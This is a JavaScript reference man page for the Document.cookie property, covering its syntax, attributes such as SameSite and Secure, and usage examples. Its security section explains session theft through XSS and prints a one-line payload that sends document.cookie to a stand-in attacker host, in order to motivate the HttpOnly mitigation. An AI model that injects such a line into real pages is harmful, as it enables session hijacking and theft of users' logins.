.\" Automatically generated by Pandoc 3.7.0.1
.\"
.TH "DOCUMENT.COOKIE" "3JS" "April 3, 2025" "JavaScript" "JavaScript Reference Manual"
.SH NAME
Document.cookie \- Document: cookie property
.SH SYNOPSIS
The \f[CR]Document\f[R] property \f[CR]cookie\f[R] lets you read and
write cookies associated with the document.
It serves as a getter and setter for the actual values of the cookies.
.SH SYNTAX
.SS Read all cookies accessible from this location
.IP
.EX
allCookies = document.cookie;
.EE
.PP
In the code above \f[CR]allCookies\f[R] is a string containing a
semicolon\-separated list of all cookies (i.e., \f[CR]key=value\f[R]
pairs).
Note that each \f[I]key\f[R] and \f[I]value\f[R] may be surrounded by
whitespace (space and tab characters): in fact, RFC 6265 mandates a
single space after each semicolon, but some user agents may not abide by
this.
.SS Write a new cookie
.IP
.EX
document.cookie = newCookie;
.EE
.PP
In the code above, \f[CR]newCookie\f[R] is a string of form
\f[CR]key=value\f[R], specifying the cookie to set/update.
Note that you can only set/update a single cookie at a time using this
method.
Consider also that:
.IP \(bu 2
Any of the following cookie attribute values can optionally follow the
key\-value pair, each preceded by a semicolon separator:
.RS 2
.IP \(bu 2
\f[CR];domain=domain\f[R] (e.g., \f[CR]example.com\f[R] or
\f[CR]subdomain.example.com\f[R]): The host to which the cookie will be
sent.
If not specified, this defaults to the host portion of the current
document location and the cookie is not available on subdomains.
If a domain is specified, subdomains are always included.
Contrary to earlier specifications, leading dots in domain names are
ignored, but browsers may decline to set the cookie containing such
dots.
.RS 2
.RS
.PP
\f[B]Note:\f[R] The domain \f[I]must\f[R] match the domain of the
JavaScript origin.
Setting cookies to foreign domains will be silently ignored.
.RE
.RE
.IP \(bu 2
\f[CR];expires=date\-in\-UTCString\-format\f[R]: The expiry date of the
cookie.
If neither \f[CR]expires\f[R] nor \f[CR]max\-age\f[R] is specified, it
will expire at the end of session.
.RS 2
.RS
.PP
\f[B]Warning:\f[R] When user privacy is a concern, it\(cqs important
that any web app implementation invalidate cookie data after a certain
timeout instead of relying on the browser to do it.
Many browsers let users specify that cookies should never expire, which
is not necessarily safe.
.RE
.PP
See \f[CR]Date.toUTCString()\f[R] for help formatting this value.
.RE
.IP \(bu 2
\f[CR];max\-age=max\-age\-in\-seconds\f[R]: The maximum age of the
cookie in seconds (e.g., \f[CR]60*60*24*365\f[R] or 31536000 for a
year).
.IP \(bu 2
\f[CR];partitioned\f[R]: Indicates that the cookie should be stored
using partitioned storage.
See Cookies Having Independent Partitioned State (CHIPS) for more
details.
.IP \(bu 2
\f[CR];path=path\f[R]: The value of the cookie\(cqs \f[CR]Path\f[R]
attribute (See Define where cookies are sent for more information).
.IP \(bu 2
\f[CR];samesite\f[R]: The \f[CR]SameSite\f[R] attribute of a
\f[CR]Set\-Cookie\f[R] header can be set by a server to specify when the
cookie will be sent.
Possible values are \f[CR]lax\f[R], \f[CR]strict\f[R] or \f[CR]none\f[R]
(see also Controlling third\-party cookies with \f[CR]SameSite\f[R]).
.RS 2
.IP \(bu 2
The \f[CR]lax\f[R] value will send the cookie for all same\-site
requests and top\-level navigation GET requests.
This is sufficient for user tracking, but it will prevent many
Cross\-Site Request Forgery (CSRF) attacks.
This is the default value in modern browsers.
.IP \(bu 2
The \f[CR]strict\f[R] value will prevent the cookie from being sent by
the browser to the target site in all cross\-site browsing contexts,
even when following a regular link.
.IP \(bu 2
The \f[CR]none\f[R] value explicitly states no restrictions will be
applied.
The cookie will be sent in all requests\(emboth cross\-site and
same\-site.
.RE
.IP \(bu 2
\f[CR];secure\f[R]: Specifies that the cookie should only be transmitted
over a secure protocol.
.RE
.IP \(bu 2
The cookie value string can use \f[CR]encodeURIComponent()\f[R] to
ensure that the string does not contain any commas, semicolons, or
whitespace (which are disallowed in cookie values).
.IP \(bu 2
Some user agent implementations support the following cookie prefixes:
.RS 2
.IP \(bu 2
\f[CR]__Secure\-\f[R] Signals to the browser that it should only include
the cookie in requests transmitted over a secure channel.
.IP \(bu 2
\f[CR]__Host\-\f[R] Signals to the browser that in addition to the
restriction to only use the cookie from a secure origin, the scope of
the cookie is limited to a path attribute passed down by the server.
If the server omits the path attribute the \(lqdirectory\(rq of the
request URI is used.
It also signals that the domain attribute must not be present, which
prevents the cookie from being sent to other domains.
For Chrome the path attribute must always be the origin.
.RS
.PP
\f[B]Note:\f[R] The dash is considered part of the prefix.
.RE
.RS
.PP
\f[B]Note:\f[R] These flags are only settable with the \f[CR]secure\f[R]
attribute.
.RE
.RE
.RS
.PP
\f[B]Note:\f[R] As you can see from the code above,
\f[CR]document.cookie\f[R] is an accessor property with native
\f[I]setter\f[R] and \f[I]getter\f[R] functions, and consequently is
\f[I]not\f[R] a data property with a value: what you write is not the
same as what you read, everything is always mediated by the JavaScript
interpreter.
.RE
.SH EXAMPLES
.SS Example 1: Simple usage
.IP
.EX
\f[I]// Note that we are setting \(gaSameSite=None;\(ga in this example because the example\f[R]
\f[I]// needs to work cross\-origin.\f[R]
\f[I]// It is more common not to set the \(gaSameSite\(ga attribute, which results in the default,\f[R]
\f[I]// and more secure, value of \(gaSameSite=Lax;\(ga\f[R]
document.cookie = \(dqname=Oeschger; SameSite=None; Secure\(dq;
document.cookie = \(dqfavorite_food=tripe; SameSite=None; Secure\(dq;

\f[B]function\f[R] showCookies() {
  \f[B]const\f[R] output = document.getElementById(\(dqcookies\(dq);
  output.textContent = \(ga> ${document.cookie}\(ga;
}

\f[B]function\f[R] clearOutputCookies() {
  \f[B]const\f[R] output = document.getElementById(\(dqcookies\(dq);
  output.textContent = \(dq\(dq;
}
.EE
.IP
.EX
<\f[B]button\f[R] onclick=\(dqshowCookies()\(dq>Show cookies</\f[B]button\f[R]>

<\f[B]button\f[R] onclick=\(dqclearOutputCookies()\(dq>Clear</\f[B]button\f[R]>

<\f[B]div\f[R]>
  <\f[B]code\f[R] id=\(dqcookies\(dq></\f[B]code\f[R]>
</\f[B]div\f[R]>
.EE
.SS Example 2: Get a sample cookie named test2
.IP
.EX
\f[I]// Note that we are setting \(gaSameSite=None;\(ga in this example because the example\f[R]
\f[I]// needs to work cross\-origin.\f[R]
\f[I]// It is more common not to set the \(gaSameSite\(ga attribute, which results in the default,\f[R]
\f[I]// and more secure, value of \(gaSameSite=Lax;\(ga\f[R]
document.cookie = \(dqtest1=Hello; SameSite=None; Secure\(dq;
document.cookie = \(dqtest2=World; SameSite=None; Secure\(dq;

\f[B]const\f[R] cookieValue = document.cookie
  .split(\(dq; \(dq)
  .find((row) \f[B]=>\f[R] row.startsWith(\(dqtest2=\(dq))
  ?.split(\(dq=\(dq)[1];

\f[B]function\f[R] showCookieValue() {
  \f[B]const\f[R] output = document.getElementById(\(dqcookie\-value\(dq);
  output.textContent = \(ga> ${cookieValue}\(ga;
}

\f[B]function\f[R] clearOutputCookieValue() {
  \f[B]const\f[R] output = document.getElementById(\(dqcookie\-value\(dq);
  output.textContent = \(dq\(dq;
}
.EE
.IP
.EX
<\f[B]button\f[R] onclick=\(dqshowCookieValue()\(dq>Show cookie value</\f[B]button\f[R]>

<\f[B]button\f[R] onclick=\(dqclearOutputCookieValue()\(dq>Clear</\f[B]button\f[R]>

<\f[B]div\f[R]>
  <\f[B]code\f[R] id=\(dqcookie\-value\(dq></\f[B]code\f[R]>
</\f[B]div\f[R]>
.EE
.SS Example 3: Do something only once
In order to use the following code, please replace all occurrences of
the word \f[CR]doSomethingOnlyOnce\f[R] (the name of the cookie) with a
custom name.
.IP
.EX
\f[B]function\f[R] doOnce() {
  \f[B]if\f[R] (
    !document.cookie
      .split(\(dq; \(dq)
      .find((row) \f[B]=>\f[R] row.startsWith(\(dqdoSomethingOnlyOnce\(dq))
  ) {
    \f[I]// Note that we are setting \(gaSameSite=None;\(ga in this example because the example\f[R]
    \f[I]// needs to work cross\-origin.\f[R]
    \f[I]// It is more common not to set the \(gaSameSite\(ga attribute, which results in the default,\f[R]
    \f[I]// and more secure, value of \(gaSameSite=Lax;\(ga\f[R]
    document.cookie =
      \(dqdoSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure\(dq;

    \f[B]const\f[R] output = document.getElementById(\(dqdo\-once\(dq);
    output.textContent = \(dq> Do something here!\(dq;
  }
}

\f[B]function\f[R] clearOutputDoOnce() {
  \f[B]const\f[R] output = document.getElementById(\(dqdo\-once\(dq);
  output.textContent = \(dq\(dq;
}
.EE
.IP
.EX
<\f[B]button\f[R] onclick=\(dqdoOnce()\(dq>Only do something once</\f[B]button\f[R]>

<\f[B]button\f[R] onclick=\(dqclearOutputDoOnce()\(dq>Clear</\f[B]button\f[R]>

<\f[B]div\f[R]>
  <\f[B]code\f[R] id=\(dqdo\-once\(dq></\f[B]code\f[R]>
</\f[B]div\f[R]>
.EE
.SS Example 4: Reset the previous cookie
.IP
.EX
\f[B]function\f[R] resetOnce() {
  \f[I]// Note that we are setting \(gaSameSite=None;\(ga in this example because the example\f[R]
  \f[I]// needs to work cross\-origin.\f[R]
  \f[I]// It is more common not to set the \(gaSameSite\(ga attribute, which results in the default,\f[R]
  \f[I]// and more secure, value of \(gaSameSite=Lax;\(ga\f[R]
  document.cookie =
    \(dqdoSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure\(dq;

  \f[B]const\f[R] output = document.getElementById(\(dqreset\-once\(dq);
  output.textContent = \(dq> Reset!\(dq;
}

\f[B]function\f[R] clearOutputResetOnce() {
  \f[B]const\f[R] output = document.getElementById(\(dqreset\-once\(dq);
  output.textContent = \(dq\(dq;
}
.EE
.IP
.EX
<\f[B]button\f[R] onclick=\(dqresetOnce()\(dq>Reset only once cookie</\f[B]button\f[R]>

<\f[B]button\f[R] onclick=\(dqclearOutputResetOnce()\(dq>Clear</\f[B]button\f[R]>

<\f[B]div\f[R]>
  <\f[B]code\f[R] id=\(dqreset\-once\(dq></\f[B]code\f[R]>
</\f[B]div\f[R]>
.EE
.SS Example 5: Check a cookie existence
.IP
.EX
\f[I]// Note that we are setting \(gaSameSite=None;\(ga in this example because the example\f[R]
\f[I]// needs to work cross\-origin.\f[R]
\f[I]// It is more common not to set the \(gaSameSite\(ga attribute, which results in the default,\f[R]
\f[I]// and more secure, value of \(gaSameSite=Lax;\(ga\f[R]
document.cookie = \(dqreader=1; SameSite=None; Secure\(dq;

\f[B]function\f[R] checkACookieExists() {
  \f[B]if\f[R] (
    document.cookie.split(\(dq;\(dq).some((item) \f[B]=>\f[R] item.trim().startsWith(\(dqreader=\(dq))
  ) {
    \f[B]const\f[R] output = document.getElementById(\(dqa\-cookie\-existence\(dq);
    output.textContent = \(aq> The cookie \(dqreader\(dq exists\(aq;
  }
}

\f[B]function\f[R] clearOutputACookieExists() {
  \f[B]const\f[R] output = document.getElementById(\(dqa\-cookie\-existence\(dq);
  output.textContent = \(dq\(dq;
}
.EE
.IP
.EX
<\f[B]button\f[R] onclick=\(dqcheckACookieExists()\(dq>Check a cookie exists</\f[B]button\f[R]>

<\f[B]button\f[R] onclick=\(dqclearOutputACookieExists()\(dq>Clear</\f[B]button\f[R]>

<\f[B]div\f[R]>
  <\f[B]code\f[R] id=\(dqa\-cookie\-existence\(dq></\f[B]code\f[R]>
</\f[B]div\f[R]>
.EE
.SS Example 6: Check that a cookie has a specific value
.IP
.EX
\f[B]function\f[R] checkCookieHasASpecificValue() {
  \f[B]if\f[R] (document.cookie.split(\(dq;\(dq).some((item) \f[B]=>\f[R] item.includes(\(dqreader=1\(dq))) {
    \f[B]const\f[R] output = document.getElementById(\(dqa\-specific\-value\-of\-the\-cookie\(dq);
    output.textContent = \(aq> The cookie \(dqreader\(dq has a value of \(dq1\(dq\(aq;
  }
}

\f[B]function\f[R] clearASpecificValueOfTheCookie() {
  \f[B]const\f[R] output = document.getElementById(\(dqa\-specific\-value\-of\-the\-cookie\(dq);
  output.textContent = \(dq\(dq;
}
.EE
.IP
.EX
<\f[B]button\f[R] onclick=\(dqcheckCookieHasASpecificValue()\(dq>
  Check that a cookie has a specific value
</\f[B]button\f[R]>

<\f[B]button\f[R] onclick=\(dqclearASpecificValueOfTheCookie()\(dq>Clear</\f[B]button\f[R]>

<\f[B]div\f[R]>
  <\f[B]code\f[R] id=\(dqa\-specific\-value\-of\-the\-cookie\(dq></\f[B]code\f[R]>
</\f[B]div\f[R]>
.EE
.SH SECURITY
It is important to note that the \f[CR]path\f[R] attribute does
\f[I]not\f[R] protect against unauthorized reading of the cookie from a
different path.
It can be easily bypassed using the DOM, for example by creating a
hidden \f[CR]<iframe>\f[R] element with the path of the cookie, then
accessing this iframe\(cqs \f[CR]contentDocument.cookie\f[R] property.
The only way to protect the cookie is by using a different domain or
subdomain, due to the same origin policy.
.PP
Cookies are often used in web applications to identify a user and their
authenticated session.
Stealing a cookie from a web application leads to hijacking the
authenticated user\(cqs session.
Common ways to steal cookies include using \c
.UR https://en.wikipedia.org/wiki/Social_engineering_(security)
social engineering
.UE \c
\ or by exploiting a cross\-site scripting (XSS) vulnerability in the
application \-
.IP
.EX
\f[B]new\f[R] Image().src = \(gahttp://www.evil\-domain.com/steal\-cookie.php?cookie=${document.cookie}\(ga;
.EE
.PP
The \f[CR]HTTPOnly\f[R] cookie attribute can help to mitigate this
attack by preventing access to cookie value through JavaScript.
Read more about \c
.UR https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/
Cookies and Security
.UE \c
\&.
.SH NOTES
.IP \(bu 2
Starting with Firefox 2, a better mechanism for client\-side storage is
available \- WHATWG DOM Storage.
.IP \(bu 2
You can delete a cookie by updating its expiration time to zero.
.IP \(bu 2
Keep in mind that the more cookies you have, the more data will be
transferred between the server and the client for each request.
This will make each request slower.
It is highly recommended for you to use WHATWG DOM Storage if you are
going to keep \(lqclient\-only\(rq data.
.IP \(bu 2
\c
.UR https://datatracker.ietf.org/doc/html/rfc2965
RFC 2965
.UE \c
\ (Section 5.3, \(lqImplementation Limits\(rq) specifies that there
should be \f[B]no maximum length\f[R] of a cookie\(cqs key or value
size, and encourages implementations to support \f[B]arbitrarily large
cookies\f[R].
Each browser\(cqs implementation maximum will necessarily be different,
so consult individual browser documentation.
.PP
The reason for the syntax of the \f[CR]document.cookie\f[R] accessor
property is due to the client\-server nature of cookies, which differs
from other client\-client storage methods (like, for instance,
localStorage):
.SS The server tells the client to store a cookie
.IP
.EX
HTTP/1.0 200 OK
Content\-type: text/html
Set\-Cookie: cookie_name1=cookie_value1
Set\-Cookie: cookie_name2=cookie_value2\f[B];\f[R] expires=Sun, 16 Jul 3567 06:23:41 GMT

[content of the page here]
.EE
.SS The client sends back to the server its cookies previously stored
.IP
.EX
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: cookie_name1=cookie_value1\f[B];\f[R] cookie_name2=cookie_value2
Accept: */*
.EE
.SH SEE ALSO
.IP \(bu 2
HTTP cookies
.IP \(bu 2
DOM Storage
.IP \(bu 2
\f[CR]URL.pathname\f[R]
.IP \(bu 2
\f[CR]Date.toUTCString()\f[R]
.IP \(bu 2
\c
.UR https://datatracker.ietf.org/doc/html/rfc2965
RFC 2965
.UE \c
